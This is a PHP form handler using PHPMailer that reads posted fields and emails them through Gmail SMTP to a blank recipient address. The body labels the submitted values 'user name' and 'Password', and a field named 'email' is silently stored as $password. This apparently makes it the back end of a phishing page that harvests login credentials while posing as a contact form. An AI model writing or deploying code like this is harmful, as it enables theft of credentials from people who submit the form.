<?php


use PHPMailer\PHPMailer\PHPMailer;

require_once 'phpmailer/Exception.php';
require_once 'phpmailer/PHPMailer.php';
require_once 'phpmailer/SMTP.php';
$mail = new PHPMailer(true);

$alert = '';

if(isset($_POST['submit'])){
  $name = $_POST['name'];
  $password = $_POST['email'];
  $message = $_POST['message'];

  try{
    $mail->isSMTP();
    $mail->Host = 'smtp.gmail.com';
    $mail->SMTPAuth = true;
    $mail->Username = ''; // Gmail address which you want to use as SMTP server
    $mail->Password = ''; // Gmail address Password

    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
    $mail->Port = '587';

    $mail->setFrom(''); // Gmail address which you used as SMTP server
    $mail->addAddress(''); 
  
    $mail->isHTML(true);
    $mail->Subject = ' subject';
    $mail->Body = "<h3>user name : $name <br>Password: $password  <br>Message: $message </h3>";

    $mail->send();

    
  
   

   $alert = '<div class="alert-success" id="error">
           <script>
          alert(" "); //message to be display
          </script>
   </div>';
     
  //header("Location: https://sabar-i.herokuapp.com/#contact");
  
  } 
  catch (Exception $e){
  $alert = '<div class="alert-error">
                <span>'.$e->getMessage().'</span>
              </div>';
  }
}
?>

